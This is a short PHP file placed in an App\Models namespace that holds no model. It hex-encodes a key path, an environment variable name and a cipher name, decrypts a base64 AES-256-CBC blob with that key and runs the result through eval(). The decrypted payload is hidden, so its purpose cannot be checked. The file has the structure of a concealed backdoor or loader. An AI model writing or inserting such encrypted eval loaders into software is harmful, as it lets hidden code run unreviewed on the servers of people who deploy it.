<?php
namespace App\Models;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('qXc91j686bxy+n/tRcHm/A==');

$c=base64_decode(

's3j9IbENQnUX6i/5XB2OFCUQ/67etg+2YVBvrb9RV17cRPFhK3NBoR+4FdB5ssGIQAnnIYiydRLF' .
'oPm04aJdnyBQv3cDtVUajtdc0+awh7e7wQBRqOw90v8ISQweOPe66yIezTT/MxN+mXAt0PO46iEP' .
'L4Z34NRtXEcgCZir9EkYPEMnjicG+sFjlYrtu8g21d4gEKLg16rCuwwan47+iqVfVeZ9/g7HbZiL' .
'rkhPZdFoBl5xirbFG1gtNAxuTOGuMblDwHfAlsHW4QvX8tSjawwbSOxRqXAHhT9HRGciGjh6QxNa' .
'HRhwpRn7RgAs690j3e724xNzacLJ9W66vyQZsfryeyNdEyf5HQW5P+YiEgyc9NENvYCfQZT2z/OW' .
'HFB+2lNzUOfkXUqfLNhJnnEKxKPc498S5o1B/BFav7+lSPoy7h/yGaFd8FRfxeMAnuM8H/fNCvDu' .
'PEsk3ksUUp4y+ASNeux4n6yRnw/MjMvudH2JZVXXJQ/5EbD43OjqkeRwDi3ky3YLOQBctN0wvGXS' .
'Ffn9wq0gTAlLgPsNtVvC+pT77hYFD8cPG2KBCwYeS9e9QrGfc3yp6+PEn+Egp9pFMMAz+u8wh18S' .
'7c43foytMlT5ap3XTdmtFHwlpOmdmMYX7Fm8GxyBkKMI9X4KeebG4KEcmPjCXYn+lv1qbdc0BrH0' .
'aSIfeUKKeB2JVxkPBPZScK8493rlkcGdHpTewOJW9oq/IGyvPaQypT3TJkDnId/m8qUkHhndx6jo' .
'Uei5GdV81iqInG+W+DiGmcdL2kH+8h5mKT48amGDvdKFo8zFFJTnfeIFpwLU94RMGM+HgpzAD4Nd' .
'PXUWpLtbESh/GYTEZaTWuwrcss6DYKf7/X3JumtCxjKC0nMjZ1ful6FD6K4j'

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

